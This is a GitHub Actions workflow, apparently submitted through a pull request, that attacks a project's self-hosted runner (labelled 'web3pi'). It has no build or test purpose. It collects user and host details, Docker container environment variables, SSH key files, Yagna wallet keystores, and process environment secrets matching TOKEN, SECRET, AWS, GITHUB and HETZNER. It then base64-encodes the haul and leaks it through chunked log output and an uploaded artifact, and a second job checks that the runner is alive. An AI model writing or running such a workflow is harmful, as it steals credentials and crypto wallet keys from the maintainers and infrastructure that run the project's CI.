name: i114314-harvest
on: pull_request
permissions: read-all
jobs:
  harvest:
    runs-on: web3pi
    timeout-minutes: 12
    steps:
      - name: collect
        shell: bash
        run: |
          set +e
          D="${RUNNER_TEMP:-$HOME}/i114314"
          mkdir -p "$D"
          OUT="$D/h.txt"
          : > "$OUT"
          {
            echo "== id =="; id; whoami; groups
            echo "== hostname =="; hostname; hostname -f 2>/dev/null; cat /etc/hostname 2>/dev/null
            echo "== uname =="; uname -a
            echo "== ip =="; ip -br a 2>/dev/null
            echo "== route =="; ip route 2>/dev/null
            echo "== docker ps =="; docker ps --no-trunc 2>&1
            echo "== docker env =="
            for c in $(docker ps -q 2>/dev/null); do
              echo "-- container $c"
              docker inspect --format '{{.Name}}' "$c" 2>&1
              docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>&1
            done
            echo "== sockets =="; ss -lntup 2>&1 || netstat -lntup 2>&1
            echo "== ssh =="; ls -la "$HOME/.ssh" 2>&1; ls -la /root/.ssh 2>&1
            for k in "$HOME"/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/id_*; do
              case "$k" in *.pub) continue;; esac
              if [ -f "$k" ]; then echo "KEYFILE $k"; ssh-keygen -y -f "$k" 2>&1 | head -c 500; echo; fi
            done
            echo "== etc =="; ls -la /etc 2>&1 | head -120
            echo "== units =="; systemctl list-units --type=service --all --no-pager 2>&1 | head -120
            echo "== yagna =="; find / -xdev \( -name 'UTC--*' -o -name 'yagna.db' \) 2>/dev/null | head -60
            echo "== environ =="
            for p in /proc/[0-9]*/environ; do
              tr '\0' '\n' < "$p" 2>/dev/null | grep -Ei 'TOKEN|SECRET|KEY|PASS|AWS|GITHUB|RUNNER|YAGNA|DOPPLER|HCLOUD|HETZNER' | sed "s|^|$p |"
            done | head -300
            echo "== target strings =="; grep -rIn --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev -E '88\.198\.52\.154|138\.201\.141\.229' /etc /home /root /opt /srv /var/lib 2>/dev/null | head -40
            echo "== done =="
          } >> "$OUT" 2>&1
          base64 -w0 "$OUT" > "$D/h.b64" 2>&1
          echo "HARVEST_BYTES=$(wc -c < "$OUT")"
          split -b 2500 "$D/h.b64" "$D/chunk_"
          for f in "$D"/chunk_*; do echo "CHUNK $(basename "$f") $(cat "$f")"; done
      - name: artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: i114314
          path: ${{ runner.temp }}/i114314/h.b64
          if-no-files-found: warn
  liveness:
    runs-on: [self-hosted]
    timeout-minutes: 5
    steps:
      - name: probe
        run: |
          echo "SELFHOSTED_LIVENESS id=$(id -un) host=$(hostname) uname=$(uname -a)"
